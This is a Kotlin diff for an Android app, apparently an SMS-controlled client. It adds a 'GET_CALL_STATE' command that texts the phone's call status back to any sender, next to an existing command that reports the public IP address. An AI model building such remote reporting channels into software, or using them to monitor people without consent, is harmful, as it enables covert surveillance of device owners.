@@ -50,6 +50,7 @@ import com.client.services.client.bluetoothAdapter
 import com.client.services.client.bluetoothLeAdvertiser
 import com.client.services.client.boolToYesNo
 import com.client.services.client.geofenceList
+import com.client.services.client.getCallState
 import com.client.services.client.getPublicIPv4
 import com.client.services.client.getPublicIPv6
 import com.client.services.client.isHttpProxyRunning
@@ -1996,6 +1997,29 @@ class SMSReceiver: BroadcastReceiver() {
                                                 context,
                                                 true,
                                                 "GET_PUBLIC_IPV4_ADDRESS: ${publicIPv4?.substring(0, min(publicIPv4.length - 1, 180 - 1))}",
+                                                serverPhoneNo = message.originatingAddress
+                                            )
+                                        }
+                                    } else if (message?.messageBody == "GET_CALL_STATE") {
+                                        if (context != null) {
+                                            val state = getCallState(context)
+                                            var str = "GET_CALL_STATE: "
+                                            when (state) {
+                                                TelephonyManager.CALL_STATE_IDLE -> str += "IDLE"
+                                                TelephonyManager.CALL_STATE_OFFHOOK -> str += "OFFHOOK"
+                                                TelephonyManager.CALL_STATE_RINGING -> str += "RINGING"
+                                            }
+                                            sendMessage(
+                                                context,
+                                                true,
+                                                str,
+                                                serverPhoneNo = message.originatingAddress
+                                            )
+                                        } else {
+                                            sendMessage(
+                                                context,
+                                                true,
+                                                "GET_CALL_STATE: Operation failed - context is null",
                                                 serverPhoneNo = message.originatingAddress
                                             )
                                         }
